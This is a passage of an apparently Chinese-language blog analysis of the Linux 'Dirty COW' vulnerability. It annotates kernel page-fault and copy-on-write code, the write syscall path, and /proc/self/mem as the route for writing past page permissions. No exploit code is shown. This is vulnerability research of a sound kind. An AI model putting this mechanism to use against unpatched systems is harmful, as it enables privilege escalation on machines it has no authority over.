handle_pte_fault(&amp;fe);<span class="hljs-comment">//进入核心处理函数</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * These routines also need to handle stuff like marking pages dirty</span><br><span class="hljs-comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span><br><span class="hljs-comment"> * RISC architectures).  The early dirtying is also good on the i386.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span><br><span class="hljs-comment"> * with external mmu caches can use to update those (ie the Sparc or</span><br><span class="hljs-comment"> * PowerPC hashed page tables that act as extended TLBs).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes, but allow</span><br><span class="hljs-comment"> * concurrent faults).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The mmap_sem may have been released depending on flags and our return value.</span><br><span class="hljs-comment"> * See filemap_fault() and __lock_page_or_retry().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br><span class="hljs-type">pte_t</span> entry;<br><br><span class="hljs-keyword">if</span> (unlikely(pmd_none(*fe-&gt;pmd))) &#123;<span class="hljs-comment">//页表指针为空，表示相应的页表项还未分配。在这种情况下，将 fe-&gt;pte 设为 NULL</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Leave __pte_alloc() until later: because vm_ops-&gt;fault may</span><br><span class="hljs-comment"> * want to allocate huge page, and if we expose page table</span><br><span class="hljs-comment"> * for an instant, it will be difficult to retract from</span><br><span class="hljs-comment"> * concurrent faults and from rmap lookups.</span><br><span class="hljs-comment"> */</span><br>fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* See comment in pte_alloc_one_map() */</span><br><span class="hljs-keyword">if</span> (pmd_trans_unstable(fe-&gt;pmd) || pmd_devmap(*fe-&gt;pmd))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * A regular pmd is established and it can&#x27;t morph into a huge</span><br><span class="hljs-comment"> * pmd from under us anymore at this point because we hold the</span><br><span class="hljs-comment"> * mmap_sem read mode and khugepaged takes it in write mode.</span><br><span class="hljs-comment"> * So now it&#x27;s safe to run pte_offset_map().</span><br><span class="hljs-comment"> */</span><br>fe-&gt;pte = pte_offset_map(fe-&gt;pmd, fe-&gt;address);<span class="hljs-comment">//使用 pte_offset_map 函数获取给定虚拟地址的页表项指针，并读取该页表项的内容到 entry 变量中。</span><br><br>entry = *fe-&gt;pte;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * some architectures can have larger ptes than wordsize,</span><br><span class="hljs-comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and</span><br><span class="hljs-comment"> * CONFIG_32BIT=y, so READ_ONCE or ACCESS_ONCE cannot guarantee</span><br><span class="hljs-comment"> * atomic accesses.  The code below just needs a consistent</span><br><span class="hljs-comment"> * view for the ifs and we later double check anyway with the</span><br><span class="hljs-comment"> * ptl lock held. So here a barrier will do.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<span class="hljs-comment">//检查页表项是否为空（指向的物理页框是否存在），如果为空，则释放之前映射的页表项并将 fe-&gt;pte 设为空。</span><br>pte_unmap(fe-&gt;pte);<br>fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//如果 fe-&gt;pte 为空，则说明页面不存在，根据 VMA（Virtual Memory Area）是否匿名执行不同的页面处理操作。</span><br><span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br><span class="hljs-keyword">return</span> do_anonymous_page(fe);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//分配物理页框</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (!pte_present(entry))<span class="hljs-comment">//如果页面已经交换到磁盘上，则执行交换页面处理操作</span><br><span class="hljs-keyword">return</span> do_swap_page(fe, entry);<br><br><span class="hljs-keyword">if</span> (pte_protnone(entry) &amp;&amp; vma_is_accessible(fe-&gt;vma))<span class="hljs-comment">//如果页面是保护的，并且 VMA 是可访问的，则执行 NUMA（Non-Uniform Memory Access）页面处理操作。</span><br><span class="hljs-keyword">return</span> do_numa_page(fe, entry);<br><br>fe-&gt;ptl = pte_lockptr(fe-&gt;vma-&gt;vm_mm, fe-&gt;pmd);<br>spin_lock(fe-&gt;ptl);<span class="hljs-comment">//自旋锁</span><br><span class="hljs-keyword">if</span> (unlikely(!pte_same(*fe-&gt;pte, entry)))<br><span class="hljs-keyword">goto</span> unlock;<br><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//存在 FAULT_FLAG_WRITE 标志位，表示缺页异常由写操作引起</span><br><span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//对应的页不可写</span><br><span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//进行写时复制，将内容写入由 do_fault()-&gt;do_cow_fault()分配的内存页中</span><br>entry = pte_mkdirty(entry);<br>&#125;<br>entry = pte_mkyoung(entry);<span class="hljs-comment">//将该页【标脏】</span><br><span class="hljs-keyword">if</span> (ptep_set_access_flags(fe-&gt;vma, fe-&gt;address, fe-&gt;pte, entry,<br>fe-&gt;flags &amp; FAULT_FLAG_WRITE)) &#123;<br>update_mmu_cache(fe-&gt;vma, fe-&gt;address, fe-&gt;pte);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is needed only for protection faults but the arch code</span><br><span class="hljs-comment"> * is not yet telling us if this is a protection fault or not.</span><br><span class="hljs-comment"> * This still avoids useless tlb flushes for .text page faults</span><br><span class="hljs-comment"> * with threads.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE)<br>flush_tlb_fix_spurious_fault(fe-&gt;vma, fe-&gt;address);<br>&#125;<br>unlock:<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<span class="hljs-comment">//解自旋锁</span><br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>第一次缺页异常的处理流程包括：</p><ul><li>检查页面对应的页表项是否为空，若为空则表示该页面未与物理页建立映射关系。</li><li>如果页表项为空，说明页面可能是进程第一次访问，需要分配一个新的物理页，并将内容初始化为0。</li><li>如果页表项不为空，可能是页面已经被换出到交换空间，需要将其交换回来。</li></ul><p>第二次缺页异常的处理流程包括：</p><ul><li>检查页面是否在主存中，如果在主存中，继续处理；如果不在主存中，可能是因为页面被换出到交换空间，需要将其交换回来。</li><li>如果页面在主存中，检查缺页异常是否由写操作引起。<ul><li>如果是写操作引起的缺页异常，检查页面是否可写，如果不可写，则执行写时复制操作；如果可写，则标记页面为已修改。</li><li>将新内容写入页表项中。</li></ul></li></ul><p>因此，我们可以得出结论，当一个进程首次访问一个内存页时，会依次触发两次缺页异常，第一次是为了建立页面与物理页的映射关系，第二次是为了处理页面在主存中的写操作引起的缺页异常。</p><h4 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//获取了指向当前虚拟内存区域（Virtual Memory Area，VMA）的指针 vma</span><br><span class="hljs-type">pgoff_t</span> pgoff = linear_page_index(vma, fe-&gt;address);<span class="hljs-comment">//计算页面偏移量，该将线性地址转换为页面偏移量</span><br><br><span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br><span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<span class="hljs-comment">//检查了 vma 对象是否具有有效的 fault 操作。如果 vma 对象中的 vm_ops 结构中的 fault 函数指针为空，说明该虚拟内存区域可能未完全初始化或者缺少 VM_DONTEXPAND 标志。在这种情况下，函数返回 VM_FAULT_SIGBUS，表示发生了总线错误。</span><br><span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br><span class="hljs-keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))<span class="hljs-comment">//如果页面错误不是写操作，则调用 do_read_fault 函数处理读取操作。</span><br><span class="hljs-keyword">return</span> do_read_fault(fe, pgoff);<br><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//如果虚拟内存区域的标志中不包含 VM_SHARED 标志，说明该区域是私有的，函数调用 do_cow_fault 函数处理写时复制错误（Copy-On-Write Fault）。</span><br><span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br><span class="hljs-keyword">return</span> do_shared_fault(fe, pgoff);<span class="hljs-comment">//虚拟内存区域是共享的，函数调用 do_shared_fault 函数处理共享错误</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="处理写时复制（无内存页）-do-cow-fault"><a href="#处理写时复制（无内存页）-do-cow-fault" class="headerlink" title="处理写时复制（无内存页）: do_cow_fault()"></a>处理写时复制（无内存页）: do_cow_fault()</h4><p>本篇主要关注写时复制的过程；<code>COW</code>流程在第一次写时触发缺页异常最终便会进入到 <code>do_cow_fault()</code> 中处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br><span class="hljs-type">void</span> *fault_entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//为当前进程分配一个新的页面</span><br><span class="hljs-keyword">if</span> (!new_page)<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br><span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//为新页面分配内存资源</span><br>&amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>put_page(new_page);<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>&#125;<br><br>ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//读取文件内容到fault_page</span><br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">goto</span> uncharge_out;<br><br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//拷贝fault_page内容到new_page</span><br>__SetPageUptodate(new_page);<br><br>ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//设置pte，置换该进程中的pte表项，对于写操作会将该页标脏（该函数会调用maybe_mkwrite()函数，其会调用pte_mkdirty()函数标脏该页）</span><br><span class="hljs-keyword">if</span> (fe-&gt;pte)<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//释放fault_page</span><br>unlock_page(fault_page);<br>put_page(fault_page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">goto</span> uncharge_out;<br><span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br>mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br>put_page(new_page);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="处理写时复制（有内存页）：do-wp-page"><a href="#处理写时复制（有内存页）：do-wp-page" class="headerlink" title="处理写时复制（有内存页）：do_wp_page"></a>处理写时复制（有内存页）：do_wp_page</h4><p>当通过 <code>do_fault()</code> 获取内存页之后，第二次触发缺页异常时便会最终交由 <code>do_wp_page()</code> 函数处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles present pages, when users try to write</span><br><span class="hljs-comment"> * to a shared page. It is done by copying the page to a new address</span><br><span class="hljs-comment"> * and decrementing the shared-page counter for the old page.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that this routine assumes that the protection checks have been</span><br><span class="hljs-comment"> * done by the caller (the low-level page fault routine in most cases).</span><br><span class="hljs-comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span><br><span class="hljs-comment"> * COW.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We also mark the page dirty at this point even though the page will</span><br><span class="hljs-comment"> * change only once the write actually happens. This avoids a few races,</span><br><span class="hljs-comment"> * and potentially makes it more efficient.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span><br><span class="hljs-comment"> * but allow concurrent faults), with pte both mapped and locked.</span><br><span class="hljs-comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_wp_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte)</span><br>__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//原有的页</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">old_page</span>;</span><br><br>old_page = vm_normal_page(vma, fe-&gt;address, orig_pte);<span class="hljs-comment">//获取缺页的线性地址对应的struct page结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为 special mapping，并无对应的struct page结构体</span><br><span class="hljs-keyword">if</span> (!old_page) &#123;<span class="hljs-comment">//NULL，说明是一个 special mapping 页面；否则说明是normal mapping页面</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span><br><span class="hljs-comment"> * VM_PFNMAP VMA.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We should not cow pages in a shared writeable mapping.</span><br><span class="hljs-comment"> * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>     (VM_WRITE|VM_SHARED))<br><span class="hljs-keyword">return</span> wp_pfn_shared(fe, orig_pte);<br><br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Take out anonymous pages first, anonymous shared vmas are</span><br><span class="hljs-comment"> * not dirty accountable.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//先处理匿名页面</span><br><span class="hljs-keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="hljs-comment">//原页面为匿名页面 &amp;&amp; 不是ksm页面</span><br><span class="hljs-type">int</span> total_mapcount;<br><span class="hljs-keyword">if</span> (!trylock_page(old_page)) &#123;<span class="hljs-comment">//多线程相关操作，判断是否有其他线程的竞争</span><br>get_page(old_page);<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>lock_page(old_page);<br>fe-&gt;pte = pte_offset_map_lock(vma-&gt;vm_mm, fe-&gt;pmd,<br>fe-&gt;address, &amp;fe-&gt;ptl);<br><span class="hljs-keyword">if</span> (!pte_same(*fe-&gt;pte, orig_pte)) &#123;<br>unlock_page(old_page);<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>put_page(old_page);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>put_page(old_page);<br>&#125;<br>        <span class="hljs-comment">//此时没有其他线程与本线程竞争了，调用 reuse_swap_page() 判断使用该页的是否只有一个进程，若是的话就直接重用该页</span><br><span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br><span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The page is all ours. Move it to</span><br><span class="hljs-comment"> * our anon_vma so the rmap code will</span><br><span class="hljs-comment"> * not search our parent or siblings.</span><br><span class="hljs-comment"> * Protected against the rmap code by</span><br><span class="hljs-comment"> * the page lock.</span><br><span class="hljs-comment"> */</span><br>page_move_anon_rmap(old_page, vma);<br>&#125;<br>unlock_page(old_page);<br><span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br>unlock_page(old_page);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>(VM_WRITE|VM_SHARED))) &#123;<br><span class="hljs-keyword">return</span> wp_page_shared(fe, orig_pte, old_page);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ok, we need to copy. Oh, well..</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//实在没法重用了，进行写时复制</span><br>get_page(old_page);<br><br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="COW和缺页异常相关流程"><a href="#COW和缺页异常相关流程" class="headerlink" title="COW和缺页异常相关流程"></a>COW和缺页异常相关流程</h2><h3 id="writeの执行流"><a href="#writeの执行流" class="headerlink" title="writeの执行流"></a>writeの执行流</h3><p>首先先来了解一下系统调用<code>write</code>的执行流</p><h4 id="sys-write"><a href="#sys-write" class="headerlink" title="sys_write"></a>sys_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE3(write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, buf,<br><span class="hljs-type">size_t</span>, count)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<span class="hljs-comment">//根据fd找到对应的文件对象和标志</span><br><span class="hljs-type">ssize_t</span> ret = -EBADF;<br><br><span class="hljs-keyword">if</span> (f.file) &#123;<br><span class="hljs-type">loff_t</span> pos = file_pos_read(f.file); <span class="hljs-comment">//读取文件对象的位置指针</span><br>ret = vfs_write(f.file, buf, count, &amp;pos);<span class="hljs-comment">//通过虚拟文件系统文件的写操作</span><br><span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>)<br>file_pos_write(f.file, pos);   <span class="hljs-comment">//设置文件对象的位置指针</span><br>fdput_pos(f);  <span class="hljs-comment">//释放这个对象的引用</span><br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br><span class="hljs-built_in">vfs_write</span>()<br><span class="hljs-built_in">__vfs_write</span>()<br>file-&gt;f_op-&gt;<span class="hljs-built_in">write</span>()<span class="hljs-comment">//该文件于内核中的文件描述符的file_operations结构体，类似于一张函数表，储存了默认的对于一些系统调用的处理函数指针</span><br></code></pre></td></tr></table></figure><h3 id="proc-self-mem：绕过页表项权限"><a href="#proc-self-mem：绕过页表项权限" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;mem：绕过页表项权限"></a>&#x2F;proc&#x2F;self&#x2F;mem：绕过页表项权限</h3><p>“脏牛”通常利用的是 <code>/proc/self/mem</code> 进行越权写入，这也是整个“脏牛”利用中较为核心的流程</p><p>对于<code>/proc/self/mem</code>这个文件对象来说, 会调用<code>mem_write()</code>函数</p><h4 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write()"></a>mem_write()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params"> <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-keyword">return</span> mem_rw(file, (<span class="hljs-type">char</span> __user*)buf, count, ppos, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mem_write</code>调用<code>mem_rw</code></p><h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw()"></a>mem_rw()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 